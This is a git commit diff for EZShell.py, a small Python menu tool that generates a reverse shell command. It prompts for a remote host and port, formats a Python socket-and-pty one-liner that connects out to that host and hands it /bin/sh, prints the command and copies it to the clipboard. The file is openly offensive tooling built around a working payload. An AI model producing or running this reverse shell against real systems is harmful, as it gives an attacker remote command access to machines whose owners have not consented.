cbcb1b5a29abe503081c27ab6125cc458f08a641
Shx-rp <45079643+Shx-rp@users.noreply.github.com>
2022-11-01 15:41:44 +0000

    Updated Version 0.2
    added whole new system to it

--- EZShell.py
+++ EZShell.py
@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import pyperclip as clip
 import os
 
 def menu():
@@ -7,18 +8,38 @@ def menu():
     \n1. Python \n2. WIP
           ''')
 
-def main():
-    os.system("clear")
+def pymenu():
+    print('''
+    ________MENU_________
+    \n1. Python2.7 \n2. WIP\n3. Back to Main Menu
+          ''')
 
-    menu()
-    selectShell = int(input("Select Number:"))
-    
+def pysubprocess():
+    selectShell = int(input("Select Library:"))
     if selectShell == 1:
         rhost = input("RHOST= ")
         port = input("PORT= ")
-        print("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port))
+        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port)
+        print(shell)
+        clip.copy(shell)
+        print("\n Copied to Clipboard!")
+    elif selectShell == 3:
+        main()
     else:
-        menu()
+        os.system("clear")
+        pymenu()
+        pysubprocess()
+
+def main():
+    os.system("clear")
+    menu()
+    selectLib = int(input("Select Library:"))
+    
+    if selectLib == 1:
+        os.system("clear")
+        pymenu()
+        pysubprocess()
+    else:
         main()
 
 if __name__ == "__main__":
